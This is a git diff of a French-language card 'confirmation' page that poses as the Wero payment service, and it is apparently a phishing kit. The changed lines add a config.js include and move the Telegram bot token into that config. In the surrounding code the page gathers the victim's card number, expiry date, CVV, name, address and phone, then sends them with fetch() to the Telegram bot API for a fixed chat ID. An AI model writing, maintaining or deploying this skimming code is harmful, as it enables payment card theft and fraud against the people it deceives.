@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+    <script src="config.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wero - Confirmation de carte</title>
@@ -953,7 +954,7 @@
                 submitBtn.textContent = 'Vérification en cours...';
                 loadingOverlay.style.display = 'flex';
                 
-                const BOT_TOKEN = '[REDACTED]';
+                const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
                 const CHAT_ID = '6078788670';
                 const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
                 fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
